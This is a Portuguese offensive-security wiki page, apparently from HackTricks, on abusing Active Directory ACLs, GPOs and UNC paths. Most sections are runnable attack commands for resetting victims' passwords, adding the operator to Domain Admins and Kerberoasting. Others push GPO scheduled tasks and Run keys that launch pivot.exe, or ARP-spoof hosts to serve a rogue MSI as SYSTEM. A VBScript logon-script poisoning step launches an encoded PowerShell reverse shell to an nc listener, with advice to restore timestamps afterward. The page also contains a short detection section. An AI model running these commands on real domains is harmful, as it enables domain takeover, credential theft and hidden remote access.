# Abusing ACLs/ACEs do Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página é principalmente um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para obter mais detalhes, consulte os artigos originais.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Direitos GenericAll em um usuário**

Esse privilégio concede a um atacante controle total sobre uma conta de usuário-alvo. Depois que os direitos `GenericAll` são confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

- **Alterar a senha do alvo**: usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- No Linux, é possível fazer o mesmo via SAMR com o `net rpc` do Samba:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se a conta estiver desabilitada, remova a flag UAC**: `GenericAll` permite editar `userAccountControl`. No Linux, o BloodyAD pode remover a flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Atribua um SPN à conta do usuário para torná-la kerberoastable; em seguida, use Rubeus e targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Desabilitar a pré-autenticação do usuário, tornando sua conta vulnerável a ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Com `GenericAll` em um usuário, você pode adicionar uma credencial baseada em certificado e autenticar-se como ele sem alterar sua senha. Consulte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Direitos GenericAll em um Grupo**

Esse privilégio permite que um invasor manipule associações de grupos caso tenha direitos `GenericAll` em um grupo como `Domain Admins`. Após identificar o nome distinto do grupo com `Get-NetGroup`, o invasor pode:

- **Adicionar a Si Mesmo ao Grupo Domain Admins**: Isso pode ser feito por meio de comandos diretos ou usando módulos como Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- A partir do Linux, você também pode usar o BloodyAD para adicionar a si mesmo a grupos arbitrários quando possuir associação GenericAll/Write sobre eles. Se o grupo alvo estiver aninhado em “Remote Management Users”, você obterá imediatamente acesso WinRM aos hosts que reconhecem esse grupo:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write em Computer/User**

Possuir esses privilégios em um objeto de computador ou em uma conta de usuário permite:

- **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computador.
- **Shadow Credentials**: Use esta técnica para personificar uma conta de computador ou usuário explorando os privilégios para criar shadow credentials.

## **WriteProperty em Group**

Se um usuário tiver direitos `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Domain Admins`), ele poderá:

- **Adicionar a si mesmo ao grupo Domain Admins**: Isso pode ser obtido combinando os comandos `net user` e `Add-NetGroupUser`; esse método permite a escalação de privilégios dentro do domínio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) em Group**

Esse privilégio permite que attackers adicionem a si mesmos a grupos específicos, como `Domain Admins`, por meio de comandos que manipulam diretamente a associação aos grupos. Usar a seguinte sequência de comandos permite a autoadição:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Um privilégio semelhante permite que os atacantes se adicionem diretamente a grupos modificando as propriedades dos grupos, caso tenham o direito `WriteProperty` sobre esses grupos. A confirmação e a execução desse privilégio são realizadas com:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Possuir o `ExtendedRight` sobre um usuário para `User-Force-Change-Password` permite redefinir senhas sem conhecer a senha atual. A verificação desse direito e sua exploração podem ser realizadas por meio do PowerShell ou de ferramentas alternativas de linha de comando, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e one-liners para ambientes não interativos. Os comandos variam desde simples invocações do PowerShell até o uso do `rpcclient` no Linux, demonstrando a versatilidade dos vetores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Se um atacante descobrir que possui direitos `WriteOwner` sobre um grupo, poderá alterar a propriedade do grupo para si mesmo. Isso é particularmente impactante quando o grupo em questão é `Domain Admins`, pois alterar a propriedade permite um controle mais amplo sobre os atributos e a associação do grupo. O processo envolve identificar o objeto correto usando `Get-ObjectAcl` e, em seguida, usar `Set-DomainObjectOwner` para modificar o proprietário, por SID ou nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Essa permissão permite que um atacante modifique as propriedades de um usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do script de logon de um usuário para executar um script malicioso quando o usuário fizer logon. Isso é obtido usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário-alvo, apontando-a para o script do atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Com esse privilégio, os attackers podem manipular a associação a grupos, como adicionar a si mesmos ou outros usuários a grupos específicos. Esse processo envolve criar um objeto de credencial, usá-lo para adicionar ou remover usuários de um grupo e verificar as alterações de associação com comandos do PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- A partir do Linux, o `net` do Samba pode adicionar/remover membros quando você possui `GenericWrite` no grupo (útil quando o PowerShell/RSAT não está disponível):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Ser proprietário de um objeto do AD e ter privilégios `WriteDACL` sobre ele permite que um atacante conceda a si mesmo privilégios `GenericAll` sobre o objeto. Isso é realizado por meio da manipulação de ADSI, permitindo controle total sobre o objeto e a capacidade de modificar suas associações a grupos. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Tomada rápida de controle com WriteDACL/WriteOwner (PowerView)

Quando você tem `WriteOwner` e `WriteDacl` sobre um usuário ou uma conta de serviço, pode assumir o controle total e redefinir a senha usando o PowerView sem saber a senha antiga:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Talvez seja necessário primeiro alterar o proprietário para você mesmo caso tenha apenas `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valide o acesso com qualquer protocolo (SMB/LDAP/RDP/WinRM) após a redefinição da senha.

## **Replicação no Domínio (DCSync)**

O ataque DCSync utiliza permissões específicas de replicação no domínio para imitar um Domain Controller e sincronizar dados, incluindo credenciais de usuários. Essa técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que atacantes extraiam informações confidenciais do ambiente AD sem acesso direto a um Domain Controller.<sup>[[5]](#references)</sup> [**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegação de GPO

O acesso delegado para gerenciar Group Policy Objects (GPOs) pode apresentar riscos significativos de segurança. Por exemplo, se um usuário como `offense\spotless` tiver direitos delegados de gerenciamento de GPO, ele poderá ter privilégios como **WriteProperty**, **WriteDacl** e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, conforme identificado usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerar Permissões de GPO

Para identificar GPOs configurados incorretamente, os cmdlets do PowerSploit podem ser encadeados. Isso permite descobrir GPOs que um usuário específico tem permissão para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computadores com uma Determinada Política Aplicada**: É possível identificar a quais computadores uma GPO específica se aplica, ajudando a compreender o escopo do possível impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas Aplicadas a um Determinado Computador**: Para ver quais políticas são aplicadas a um computador específico, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs com uma Determinada Política Aplicada**: A identificação das unidades organizacionais (OUs) afetadas por uma determinada política pode ser feita usando `Get-DomainOU`.

Você também pode usar a ferramenta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs e encontrar problemas nelas.

### Abusar de GPO - New-GPOImmediateTask

GPOs configuradas incorretamente podem ser exploradas para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo de administradores locais nas máquinas afetadas, elevando significativamente os privilégios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

O módulo GroupPolicy, se instalado, permite a criação e vinculação de novos GPOs, além da configuração de preferências, como valores do registro, para executar backdoors nos computadores afetados. Este método requer que o GPO seja atualizado e que um usuário faça login no computador para que ocorra a execução:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações sem a necessidade de criar novas GPOs. Essa ferramenta exige a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novas antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar a atualização da política

As atualizações de GPO normalmente ocorrem aproximadamente a cada 90 minutos. Para acelerar esse processo, especialmente após implementar uma alteração, o comando `gpupdate /force` pode ser usado no computador-alvo para forçar uma atualização imediata da política. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo de atualização automática.

### Por baixo do capô

Ao inspecionar as Scheduled Tasks de uma determinada GPO, como a `Misconfigured Policy`, é possível confirmar a adição de tarefas como `evilTask`. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou elevar privilégios.

A estrutura da tarefa, conforme exibida no arquivo de configuração XML gerado por `New-GPOImmediateTask`, descreve os detalhes da Scheduled Task, incluindo o comando a ser executado e seus gatilhos. Esse arquivo representa como as Scheduled Tasks são definidas e gerenciadas dentro das GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação da política.

### Usuários e Grupos

As GPOs também permitem a manipulação das associações de usuários e grupos nos sistemas-alvo. Ao editar diretamente os arquivos de política Users and Groups, os atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite modificar os arquivos de política para incluir novos usuários ou alterar associações de grupos.

O arquivo de configuração XML de Users and Groups descreve como essas alterações são implementadas. Ao adicionar entradas a esse arquivo, usuários específicos podem receber privilégios elevados nos sistemas afetados. Esse método oferece uma abordagem direta para a elevação de privilégios por meio da manipulação de GPOs.

Além disso, outros métodos para executar código ou manter persistência, como aproveitar scripts de logon/logoff, modificar chaves do registro para autoruns, instalar software por meio de arquivos .msi ou editar configurações de serviços, também podem ser considerados. Essas técnicas oferecem vários caminhos para manter o acesso e controlar sistemas-alvo por meio do abuso de GPOs.

### Redirecionar a recuperação de GPC/GPT para serviços rogue autenticados

Uma GPO consiste em um **Group Policy Container (GPC)** baseado em LDAP, com metadados, e em um **Group Policy Template (GPT)** hospedado em SMB, com os arquivos de política. Durante a atualização, o cliente segue o `gPLink` do contêiner, lê o GPC referenciado e seu `gPCFileSysPath` e, em seguida, baixa o GPT desse caminho UNC. Consequentemente, o acesso de escrita ao próprio GPC ou ao `gPLink` de uma OU, Site ou Domain pode ser convertido em processamento privilegiado de políticas.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Poisoning de `gPCFileSysPath` com GPOddity

Se o principal controlado puder escrever no GPC-alvo (diretamente ou por meio de **NTLM relay to LDAP**), substitua `gPCFileSysPath` por um caminho UNC hospedado pelo atacante. [GPOddity](https://github.com/synacktiv/GPOddity) automatiza a alteração no LDAP e disponibiliza um GPT malicioso contendo arquivos de política baseados em módulos ou uma Immediate Task que o cliente de Group Policy executa como `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Um compartilhamento SMB anônimo ou independente de credenciais não é suficiente nos clientes Windows atuais: o SMB Secure Negotiate exige uma prova de que a autenticação foi bem-sucedida, portanto o serviço rogue deve validar a identidade do domínio, derivar a chave de sessão SMB e assinar corretamente suas respostas. No modo incorporado, configure o GPOddity com uma conta de máquina controlada e sua chave de serviço e, em seguida, selecione um payload do lado do computador ou do usuário na seção `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Caso extremo de GPO do usuário:** após o MS16-072, o Windows ainda cria duas sessões SMB2 na **mesma conexão TCP**: a sessão do usuário lê `GPT.INI`, e depois a sessão da conta do computador lê a configuração efetiva, como `ScheduledTasks.xml`. Portanto, um servidor rogue deve indexar o estado de autenticação, as chaves de sessão e as chaves de assinatura por `SMB2 SessionId`, e não apenas pelo socket. O fork do Scapy incorporado ao GPOddity/OUned implementa isso por meio de `SMBStreamSocketMultiplexing` e de um `SMBServer` compatível com multiplexação; caso contrário, servidores Impacket/Scapy de sessão única reutilizam o estado de assinatura incorreto e falham com as políticas de usuário.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

Com `WriteGPLink`, `GenericWrite` ou controle equivalente sobre uma OU, Site ou Domain, um atacante pode adicionar um link cujo GPC DN é servido por um host LDAP controlado pelo atacante. Essa primitiva foi apresentada originalmente por Petros Koutroumpis; o [OUned](https://github.com/synacktiv/OUned) automatiza a gravação LDAP e a cadeia GPC/GPT maliciosa.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
A vítima primeiro se autentica no serviço LDAP malicioso e recebe um GPC cujo `gPCFileSysPath` aponta para o serviço SMB malicioso; em seguida, ela se autentica no SMB e aplica o GPT fornecido. Portanto, OUned precisa de uma conta com um SPN LDAP, uma conta de máquina com um SPN HOST para SMB (a mesma conta de máquina pode atender a ambos) e resolução DNS ou encaminhamento reverso que direcione as portas 389 e 445 para o host do operador.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
O servidor LDAP Scapy incorporado do OUned valida Kerberos/SPNEGO com a chave de serviço real controlada e fornece dados GPC arbitrários a partir de JSON. A chave JSON vazia representa rootDSE, os prefixos `base64:` representam valores binários, e o servidor oferece suporte a pesquisas `add`/`delete`/`modify`/`search`, além de pesquisas `BASE`, `LEVEL` e `SUBTREE`; ele pode negociar nenhuma proteção, integridade ou confidencialidade. Isso torna o serviço reutilizável quando outro componente do Windows segue uma referência LDAP controlada pelo atacante, mas exige LDAP autenticado.<sup>[[15]](#references)</sup>

Não presuma que sincronizar a senha de uma conta em um domínio fictício reproduza todas as chaves Kerberos: RC4 é derivado da senha, enquanto o string-to-key do AES também usa um salt derivado do hostname/domínio do principal. Fornecer a chave AES real da conta ao `KerberosSSP` evita forçar o uso de RC4 por meio de uma alteração detectável no `msDS-SupportedEncryptionTypes` autoescrevível da conta da máquina.<sup>[[15]](#references)</sup>

#### Pivôs de detecção

Correlacione alterações em `gPCFileSysPath` ou `gPLink` com alterações de versão de GPO e novos XMLs de Immediate/Scheduled Task. Investigue links para naming contexts inesperados, hosts UNC fora do conjunto aprovado de DC/SYSVOL, registros DNS que redirecionem nomes de contas de máquina, tickets de serviço LDAP/CIFS para contas de máquina incomuns e alterações em `msDS-SupportedEncryptionTypes` que habilitem RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + sequestro de caminho UNC (ARP spoofing)

`WriteGPLink` sobre uma OU/domínio permite modificar o atributo `gPLink` do contêiner-alvo e **forçar a aplicação de uma GPO existente** sem editar a própria GPO. Isso se torna interessante quando a GPO vinculada já referencia conteúdo remoto por meio de **caminhos UNC** (`\\HOST\share\...`), pois usuários autenticados podem ler o **SYSVOL** e procurar políticas reutilizáveis offline.<sup>[[11]](#references)</sup>

Fluxo de trabalho de alto nível:

1. Use o BloodHound para identificar um principal com `WriteGPLink` sobre uma OU e enumerar computadores/usuários dentro dessa OU.
2. Clone o `SYSVOL` em modo somente leitura e analise as GPOs em busca de **Software Installation**, **mapeamentos de unidades** (`Drives.xml`) e **scripts de logon/inicialização** que referenciem caminhos UNC.
3. Dê preferência a políticas que apontem para um **hostname direto** (por exemplo, `\\DC02\share\pkg.msi`) em vez de caminhos de namespace DFS/domínio, pois caminhos baseados em hostname são mais fáceis de redirecionar com spoofing de L2.
4. Adicione o GUID da GPO escolhida ao `gPLink` da OU-alvo para que a vítima processe essa política já existente.
5. No mesmo domínio de broadcast, faça ARP spoof do host UNC e associe seu IP localmente (`ip addr add <target_ip>/32 dev <iface>`) para que o tráfego SMB da vítima chegue ao seu host.
6. Disponibilize o caminho/nome de arquivo esperado a partir de um servidor SMB do atacante (por exemplo, `smbserver.py`) e aguarde o processamento normal da política.

Exemplo de coleta do `SYSVOL` e correlação de GPOs:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Vincule o GPO existente à OU de destino:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

If the linked GPO deploys an MSI from a UNC path, the cliente o buscará durante a **inicialização do computador** e o instalará como **`NT AUTHORITY\SYSTEM`**. Ao falsificar o host referenciado e disponibilizar um MSI malicioso no **mesmo compartilhamento/caminho/nome**, você pode transformar `WriteGPLink` em execução de código como SYSTEM **sem modificar o SYSVOL**.

Restrições importantes:

- **O timing é importante**: o novo link é visto na atualização da policy (comumente ~90 minutos), mas o **Software Installation** geralmente é acionado na **reinicialização**.
- O Windows Installer normalmente rastreia o deployment usando o **`ProductCode`** do pacote. Se o produto já estiver instalado, o deployment poderá ser ignorado.
- Para evitar a rejeição pelo installer, faça patch no MSI rogue para que seu **`ProductCode`** e **`PackageCode`** correspondam aos do pacote legítimo esperado pela GPO.
- Arquivos `.aas` antigos de advertisement podem permanecer no `SYSVOL`; portanto, valide se o deployment ainda parece ativo antes de depender dele.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Os mapeamentos de unidades GPP em `Drives.xml` fazem com que os usuários se autentiquem no caminho UNC configurado durante o logon ou a reconexão. Se você falsificar o host referenciado, poderá capturar **NetNTLMv2**. Se o SMB for deliberadamente feito falhar, o Windows poderá tentar novamente via **WebDAV**, enviando **NTLM over HTTP**, que é muito mais flexível para relays para **LDAP(S)**, **AD CS** ou **SMB**.

#### Logon/startup script UNC hijack

O mesmo padrão se aplica aos scripts hospedados em UNC descobertos no `SYSVOL`:

- **Logon scripts** geralmente são executados no contexto do **usuário**.
- **Startup scripts** geralmente são executados no contexto do **computador / SYSTEM**.

Se o caminho do script apontar para um hostname falsificável, redirecione o host UNC e forneça o conteúdo de um script substituto a partir do local esperado.

## SYSVOL/NETLOGON Logon Script Poisoning

Caminhos graváveis em `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permitem adulterar scripts de logon executados no logon do usuário via GPO. Isso resulta em execução de código no contexto de segurança dos usuários que fazem logon.

### Localizar logon scripts
- Inspecione os atributos do usuário em busca de um logon script configurado:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Faça crawling nos compartilhamentos do domínio para identificar atalhos ou referências a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analise arquivos `.lnk` para identificar destinos que apontam para SYSVOL/NETLOGON (truque útil de DFIR e para atacantes sem acesso direto a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- O BloodHound exibe o atributo `logonScript` (scriptPath) nos nós de usuários quando presente.

### Validar acesso de gravação (não confie nas listagens de compartilhamentos)
As ferramentas automatizadas podem mostrar SYSVOL/NETLOGON como somente leitura, mas as ACLs NTFS subjacentes ainda podem permitir gravações. Sempre teste:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Se o tamanho do arquivo ou o mtime mudar, você tem permissão de escrita. Preserve os originais antes de modificar.

### Envenene um script de logon VBScript para RCE
Acrescente um comando que inicie um reverse shell do PowerShell (gerado a partir de revshells.com) e mantenha a lógica original para evitar interromper a função de negócio:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Escute no seu host e aguarde o próximo logon interativo:
```bash
rlwrap -cAr nc -lnvp 443
```
Observações:
- A execução ocorre sob o token do usuário de logging (não SYSTEM). O escopo é o vínculo da GPO (OU, site, domínio) que aplica esse script.
- Faça a limpeza restaurando o conteúdo/timestamps originais após o uso.


## References

- [1] [Abusando de ACLs/ACEs do Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Contas privilegiadas e privilégios de token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – A atualização do caminho de ataque de ACL](https://wald0.com/?p=112)
- [4] [Enumeração ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalonando privilégios com ACLs no Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Verificando privilégios e contas privilegiadas do Active Directory](https://adsecurity.org/?p=3658)
- [7] [Construtor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operações de atributos/UAC do AD a partir do Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (associação a grupos)](https://www.samba.org/)
- [10] [HTB Puppy: abuso de ACL do AD, cracking de Argon2 do KeePassXC e descriptografia de DPAPI até administrador do DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: sequestrando caminhos UNC de GPO para execução de código e NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: explorando GPOs do Active Directory por meio de NTLM relaying e muito mais](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [A OU está tirando sarro? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: explorando vetores ocultos de ataque de ACLs de Organizational Units no Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulando serviços legítimos do Active Directory na rede: o caso da exploração de GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
